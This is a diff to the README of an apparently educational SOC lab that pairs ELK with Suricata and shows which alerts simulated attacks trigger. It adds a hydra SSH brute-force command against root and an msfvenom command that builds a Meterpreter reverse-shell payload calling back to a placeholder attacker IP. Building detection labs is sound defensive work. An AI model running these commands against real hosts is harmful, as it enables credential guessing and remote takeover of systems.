@@ -30,7 +30,7 @@ The goal of this project is to demonstrate how a SOC analyst can:
 The following architecture illustrates how logs flow from monitored systems to the SIEM platform.
 
 ## Architecture Diagram
-![Architecture](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/Screenshot%202026-04-10%20141535.png?raw=true)
+![Architecture](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/Architecture.png)
 
 ### 🖥 Lab Components
 
@@ -79,7 +79,38 @@ nmap -sS -sV -O -T4 <target-ip>
 ```
 
 **Attack simulation**
+![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/NmapAttack.png)
 
+**Suricata alerts**
+![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/NmapLogs.png)
 
+## SSH Brute Force Attack
 
+Multiple login attempts against the Ubuntu Server.
+
+SSH Brute Force using
+```text
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>
+```
+
+**Attack simulation**
+![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/SSHBruteAttack.png)
+
+**Suricata alerts**
+![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/SSHBruteLogs.png)
+
+## Attack Through Metasploit Framework
+
+Using reverse shell payload created by Metasploit to make a connection to victim
+
+Command for creating payload
+```text
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f elf > shell.elf
+```
+
+**Attack simulation**
+![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/MetasploitAttack.png)
+
+**Suricata alerts**
+![Attacker](https://github.com/wanghui070404/ELK_Suricata_Deployment/blob/main/src/MetasploitLogs.png)
 
